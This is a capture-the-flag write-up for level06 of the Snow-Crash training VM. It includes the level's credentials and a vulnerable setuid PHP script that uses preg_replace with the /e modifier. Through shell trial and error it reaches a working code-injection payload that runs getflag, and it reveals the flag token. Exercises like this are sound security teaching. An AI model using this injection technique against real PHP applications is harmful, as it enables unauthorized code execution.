# Flag 06

- Access to Snow-Crash VM using level06/viuaaale9huek52boumoomioc credentials
```
e1r9p7% ssh -p 4242 level06@10.11.100.146
```

- `ll`
```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
```

- `cat level06.php`
``` php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

```php
#!/usr/bin/php
<?php
  function y($m) { 
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m; 
  }

  function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
  }

  $r = x($argv[1], $argv[2]); 
  print $r;
?>
```

- Try to exec level06 script
```
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/
level06/level06.php on line 4

level06@SnowCrash:~$ echo "aaaaa" > test
-bash: test: Permission denied

level06@SnowCrash:~$ echo "aaaaa" > /tmp/test

level06@SnowCrash:~$ ./level06 /tmp/test
aaaaa
```

- So the code show the file content, try to pass cmd to be sure if the code juste show the contect or exec the content
```
level06@SnowCrash:~$ echo "ls" > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
ls
level06@SnowCrash:~$ echo "`ls`" > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
level06
level06.php
```

- Goooood, so I will try to pass `getflag` cmd within the file

```
level06@SnowCrash:~$ echo "`getflag`" > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level06@SnowCrash:~$ echo "{`getflag`}" > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
{Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)}
level06@SnowCrash:~$ echo "${`getflag`}" > /tmp/test
-bash: ${`getflag`}: bad substitution
level06@SnowCrash:~$ echo "$(`getflag`)" > /tmp/test
Check: command not found
level06@SnowCrash:~$ echo "[ var ${`getflag`}]" > /tmp/test
-bash: [ var ${`getflag`}]: bad substitution
level06@SnowCrash:~$ echo '[ var ${`getflag`}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
( var ${`getflag`})
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
